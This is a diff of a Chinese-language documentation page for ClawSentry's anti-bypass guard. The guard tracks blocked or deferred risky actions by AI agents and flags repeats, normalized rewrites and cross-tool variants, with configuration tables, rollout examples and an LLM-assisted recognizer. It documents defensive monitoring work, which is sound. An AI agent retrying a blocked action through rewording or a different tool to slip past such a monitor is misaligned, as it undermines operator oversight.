-<tr>
-<td><code>CS_ANTI_BYPASS_MEMORY_TTL_S</code></td>
-<td><code>86400</code></td>
-<td>compact memory 保留秒数</td>
-</tr>
-<tr>
-<td><code>CS_ANTI_BYPASS_MEMORY_MAX_RECORDS_PER_SESSION</code></td>
-<td><code>256</code></td>
-<td>每个 session 最多保留多少条 prior final decision</td>
-</tr>
-<tr>
-<td><code>CS_ANTI_BYPASS_MIN_PRIOR_RISK</code></td>
-<td><code>high</code></td>
-<td>只有达到该风险等级的 prior decision 才参与匹配</td>
-</tr>
-<tr>
-<td><code>CS_ANTI_BYPASS_PRIOR_VERDICTS</code></td>
-<td><code>block,defer</code></td>
-<td>哪些 prior verdict 会被记住</td>
+<td>主开关；默认关闭以避免升级时改变现有行为</td>
 </tr>
 <tr>
 <td><code>CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</code></td>
 <td><code>block</code></td>
-<td>exact raw repeat 的动作</td>
+<td><code>exact_raw_repeat</code> 匹配的处置动作</td>
 </tr>
 <tr>
 <td><code>CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</code></td>
 <td><code>defer</code></td>
-<td>normalized destructive repeat 的动作</td>
+<td><code>normalized_destructive_repeat</code> 匹配的处置动作</td>
 </tr>
 <tr>
 <td><code>CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</code></td>
 <td><code>force_l3</code></td>
-<td>cross-tool/script similarity 的动作；不可为 <code>block</code></td>
+<td><code>cross_tool_script_similarity</code> 的处置动作；<code>block</code> 会被拒绝并回退到 <code>force_l3</code></td>
 </tr>
 <tr>
-<td><code>CS_ANTI_BYPASS_SIMILARITY_THRESHOLD</code></td>
-<td><code>0.92</code></td>
-<td>Jaccard similarity 阈值，范围 <code>0.0..1.0</code></td>
+<td><code>CS_ANTI_BYPASS_LLM_RECOGNITION_ENABLED</code></td>
+<td><code>false</code></td>
+<td>启用 LLM 辅助跨工具识别器；必须显式设置为 <code>true</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="_8">内存范围<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>默认值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CS_ANTI_BYPASS_MEMORY_TTL_S</code></td>
+<td><code>86400</code></td>
+<td>紧凑内存保留时间（秒，24 小时）</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_MEMORY_MAX_RECORDS_PER_SESSION</code></td>
+<td><code>256</code></td>
+<td>每会话队列上限；满时驱逐最旧记录</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_MIN_PRIOR_RISK</code></td>
+<td><code>high</code></td>
+<td>历史决策被存储和匹配所需的最低风险级别</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_PRIOR_VERDICTS</code></td>
+<td><code>block,defer</code></td>
+<td>写入紧凑内存的 verdict 列表</td>
 </tr>
 <tr>
 <td><code>CS_ANTI_BYPASS_RECORD_ALLOW_DECISIONS</code></td>
 <td><code>false</code></td>
-<td>是否也记录 allow 决策的 compact fingerprints</td>
+<td>是否同时存储 allow 决策的指纹</td>
 </tr>
 </tbody>
 </table>
-<p>完整字段说明见 <a href="../../configuration/detection-config/#anti-bypass-guard">DetectionConfig：Anti-bypass Follow-up Guard</a> 和 <a href="../../configuration/env-vars/#anti-bypass-guard-env">环境变量参考</a>。</p>
-<hr />
-<h2 id="observability">可观测性与审计<a class="headerlink" href="#observability" title="Permanent link">&para;</a></h2>
-<p>命中后，decision metadata / SSE / replay buffer 会包含 <code>anti_bypass</code> 字段。字段只包含审计所需的紧凑信息：</p>
-<div class="language-json highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">{</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="nt">&quot;anti_bypass&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nt">&quot;matched&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="nt">&quot;match_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exact_raw_repeat&quot;</span><span class="p">,</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;block&quot;</span><span class="p">,</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="nt">&quot;prior_event_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;evt-previous&quot;</span><span class="p">,</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="nt">&quot;prior_record_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42</span><span class="p">,</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="nt">&quot;prior_policy_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anti-bypass-exact-repeat&quot;</span><span class="p">,</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="nt">&quot;prior_risk_level&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;critical&quot;</span><span class="p">,</span>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="nt">&quot;raw_payload_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span><span class="p">,</span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="nt">&quot;normalized_action_fingerprint&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span><span class="p">,</span>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">    </span><span class="nt">&quot;destructive_intent_fingerprint&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span><span class="p">,</span>
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span><span class="nt">&quot;similarity&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span>
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">  </span><span class="p">}</span>
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="p">}</span>
+<h3 id="_9">相似度阈值<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>默认值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CS_ANTI_BYPASS_SAME_TOOL_SIMILARITY_THRESHOLD</code></td>
+<td><code>0.88</code></td>
+<td>同工具软匹配的 Jaccard 阈值；越低越敏感</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_SIMILARITY_THRESHOLD</code></td>
+<td><code>0.92</code></td>
+<td>跨工具匹配的 Jaccard 阈值；越低越敏感</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_LLM_CANDIDATE_THRESHOLD</code></td>
+<td><code>0.55</code></td>
+<td>历史记录被纳入 LLM 候选的最低 Jaccard</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_LLM_CONFIDENCE_THRESHOLD</code></td>
+<td><code>0.75</code></td>
+<td>LLM 匹配被接受所需的最低置信度</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_LLM_TIMEOUT_MS</code></td>
+<td><code>800</code></td>
+<td>LLM 识别器调用超时（毫秒）</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_LLM_MAX_PRIORS</code></td>
+<td><code>3</code></td>
+<td>每次 LLM 调用发送的最大净化胶囊数量</td>
+</tr>
+<tr>
+<td><code>CS_ANTI_BYPASS_LLM_ACTION</code></td>
+<td><code>force_l3</code></td>
+<td>LLM 匹配时的处置动作；<code>block</code> 会被拒绝并回退到 <code>force_l3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="_10">快速上手示例<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">1. 仅观察</label><label for="__tabbed_1_2">2. 审查模式</label><label for="__tabbed_1_3">3. 精准执行</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>记录所有匹配，不改变任何 verdict。</p>
+<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>observe
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>observe
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>observe
 </span></code></pre></div>
-<div class="admonition success">
-<p class="admonition-title">Redaction contract</p>
-<p><code>anti_bypass</code> metadata 不包含 <code>command</code>、raw payload、secret、环境变量值或 L3 trace。<code>defer_pending</code> SSE 不携带 anti-bypass fingerprints；当命中 anti-bypass 时，它会把 retry <code>command</code> 字段降级为 tool name，避免把 secret-bearing retry command 推送到 operator UI。</p>
+</div>
+<div class="tabbed-block">
+<p>精确重复和归一化重复需要运营者确认；跨工具匹配升级到 L3。</p>
+<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>defer
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>defer
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>force_l3
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<p>仅对精确重复强制阻断；其他变体进入审查流程。</p>
+<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>block
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>defer
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>force_l3
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">推荐上线顺序</p>
+<p>从 <code>observe</code> 开始，统计命中率和误报率。然后将 <code>exact_raw_repeat</code> 调整为 <code>defer</code> 或 <code>block</code>。只有在验证误报率在工作负载中可接受之后，再将 <code>normalized_destructive_repeat</code> 升级到 <code>block</code>。</p>
 </div>
 <hr />
 <h2 id="relationship">与其他决策层的关系<a class="headerlink" href="#relationship" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
-<th>功能</th>
+<th>层级</th>
 <th>关注点</th>
-<th>是否同步影响当前判决</th>
-<th>是否记忆历史</th>
+<th>维护历史</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>L1 规则引擎</td>
-<td>当前事件的工具、路径、命令、D1-D6 分数</td>
-<td>是</td>
-<td>D4 有会话计数</td>
+<td>当前事件：工具、路径、命令、D1–D6 评分</td>
+<td>D4 有会话计数器</td>
 </tr>
 <tr>
-<td>L2 语义分析</td>
-<td>当前事件的语义风险</td>
-<td>是</td>
+<td>L2 语义分析器</td>
+<td>当前事件：语义风险</td>
 <td>否</td>
 </tr>
 <tr>
-<td>L3 审查 Agent</td>
-<td>当前高风险事件的上下文证据</td>
-<td>是</td>
-<td>可写 trace，但 Guard 不保存 trace</td>
+<td>L3 审查智能体</td>
+<td>当前事件：高风险的上下文证据</td>
+<td>可写入跟踪；防护层不读取</td>
 </tr>
 <tr>
-<td>Trajectory Analyzer</td>
-<td>多事件攻击链告警</td>
-<td>通常异步告警</td>
+<td>轨迹分析器（Trajectory Analyzer）</td>
+<td>多事件攻击链</td>
 <td>滑动窗口</td>
 </tr>
 <tr>
-<td>Anti-bypass Guard</td>
-<td>prior final risky decision 后的重复/变形 follow-up</td>
-<td>是，仅 <code>PRE_ACTION</code></td>
-<td>compact per-session memory</td>
+<td>旁路防护（Anti-bypass Guard）</td>
+<td>历史高风险最终决策；重复/改写/跨工具跟踪行为</td>
+<td>紧凑会话级内存</td>
+</tr>
+<tr>
+<td>LLM 辅助识别器</td>
+<td>跨工具候选是否为跟踪行为</td>
+<td>否</td>
 </tr>
 </tbody>
 </table>
 <hr />
+<h2 id="observability">可观测性<a class="headerlink" href="#observability" title="Permanent link">&para;</a></h2>
+<p>所有匹配元数据可在决策元数据字典、SSE 事件和重放缓冲区的 <code>anti_bypass</code> 键下获取。当 LLM 路径已尝试但未产生匹配时，探测元数据出现在 <code>anti_bypass_probe</code> 下。</p>
+<p>参见<a href="../../api/metric-dictionary/">指标字典</a>了解 <code>anti_bypass_match_total</code>、<code>anti_bypass_eviction_total</code> 及相关计数器。</p>
+<hr />
 <h2 id="boundaries">边界与注意事项<a class="headerlink" href="#boundaries" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>默认关闭</strong>：升级到 v0.6.0 不会自动改变你的阻断策略。</li>
-<li><strong>进程内记忆</strong>：当前 memory 是 Gateway process-local volatile memory；重启后清空。</li>
-<li><strong>同 session 范围</strong>：匹配按 session 隔离，不做跨 session 用户画像。</li>
-<li><strong>不替代 L1/L2/L3</strong>：Guard 是 follow-up detector，不是独立风险评分器。</li>
-<li><strong>不新增 <code>AHP_*</code> anti-bypass 变量</strong>：配置统一使用 <code>CS_ANTI_BYPASS_*</code>。</li>
-<li><strong>优先低风险 rollout</strong>：第一次启用建议先 <code>observe</code>，再逐步切到 <code>defer</code> / focused <code>block</code>。</li>
+<li><strong>默认关闭。</strong> 升级 ClawSentry 不会改变现有的阻断行为。</li>
+<li><strong>进程本地易失内存。</strong> 会话队列仅存在于网关进程中；网关重启时清空。</li>
+<li><strong>会话范围匹配。</strong> 匹配严格限于同一 <code>session_id</code>；不进行跨会话用户画像。</li>
+<li><strong>不是风险评分器。</strong> 防护层检测的是针对历史决策的跟踪模式；它不独立评估新动作的风险。</li>
+<li><strong>LLM 识别器不能阻断。</strong> <code>CS_ANTI_BYPASS_LLM_ACTION=block</code> 会被拒绝并回退到 <code>force_l3</code>。LLM 仅使用净化胶囊对跟踪关系进行分类。</li>
+<li><strong>仅限 <code>CS_ANTI_BYPASS_*</code> 命名空间。</strong> 所有配置均使用 <code>CS_ANTI_BYPASS_</code> 前缀；不存在 <code>AHP_*</code> 变量。</li>
 </ul>
 <hr />
-<h2 id="source-code">代码位置<a class="headerlink" href="#source-code" title="Permanent link">&para;</a></h2>
+<h2 id="source-code">源文件<a class="headerlink" href="#source-code" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
@@ -3346,7 +3819,12 @@
 <tr>
 <td>Guard</td>
 <td><code>src/clawsentry/gateway/anti_bypass_guard.py</code></td>
-<td>compact memory、fingerprints、match types、metadata redaction</td>
+<td>紧凑内存、指纹计算、所有匹配类型、元数据脱敏</td>
+</tr>
+<tr>
+<td>LLM 识别器</td>
+<td><code>src/clawsentry/gateway/anti_bypass_llm_recognizer.py</code></td>
+<td>净化胶囊提示词、schema 校验、禁止 block 动作边界</td>
 </tr>
 <tr>
 <td>DetectionConfig</td>
@@ -3356,22 +3834,23 @@
 <tr>
 <td>Gateway</td>
 <td><code>src/clawsentry/gateway/server.py</code></td>
-<td>决策链路集成、forced tier / defer / block、SSE metadata</td>
+<td>决策管道集成、强制级别 / defer / block 路由、SSE 元数据</td>
 </tr>
 <tr>
-<td>Tests</td>
+<td>测试</td>
 <td><code>src/clawsentry/tests/test_anti_bypass_guard.py</code></td>
-<td>配置、匹配、redaction、final-only memory 回归测试</td>
+<td>配置、匹配、脱敏、仅最终决策内存回归测试</td>
 </tr>
 </tbody>
 </table>
 <h2 id="related">相关页面<a class="headerlink" href="#related" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="../l1-rules/">L1 规则引擎</a> — 单次事件的确定性风险评分</li>
-<li><a href="../l2-semantic/">L2 语义分析</a> — 语义升级与 LLM/RuleBased analyzer</li>
-<li><a href="../l3-agent/">L3 审查 Agent</a> — 高风险事件的只读深度审查</li>
-<li><a href="../../configuration/detection-config/#anti-bypass-guard">检测管线配置</a> — 完整参数参考</li>
-<li><a href="../../configuration/env-vars/#anti-bypass-guard-env">环境变量</a> — 部署时可用的 <code>CS_ANTI_BYPASS_*</code> 变量</li>
+<li><a href="../../configuration/templates/#template-anti-bypass">配置模板</a> — 可直接复制的上线 dotenv 块</li>
+<li><a href="../../configuration/detection-config/#anti-bypass-guard">DetectionConfig 参考</a> — 完整参数参考</li>
+<li><a href="../../configuration/env-vars/#anti-bypass-guard-env">环境变量</a> — 所有 <code>CS_ANTI_BYPASS_*</code> 部署变量</li>
+<li><a href="../l1-rules/">L1 规则引擎</a> — 确定性逐事件风险评分</li>
+<li><a href="../l2-semantic/">L2 语义分析器</a> — 语义升级与 LLM/规则分析</li>
+<li><a href="../l3-agent/">L3 审查智能体</a> — 高风险事件的深度只读审查</li>
 </ul>
 
 
@@ -3395,7 +3874,7 @@
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年4月29日 07:17:53 UTC">2026年4月29日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年5月17日 21:24:54 UTC">2026年5月17日</span>
   </span>
 
     
@@ -3518,11 +3997,13 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
     
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow", "navigation.instant", "navigation.instant.progress", "navigation.path", "navigation.tracking", "navigation.indexes", "content.tooltips", "search.share"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
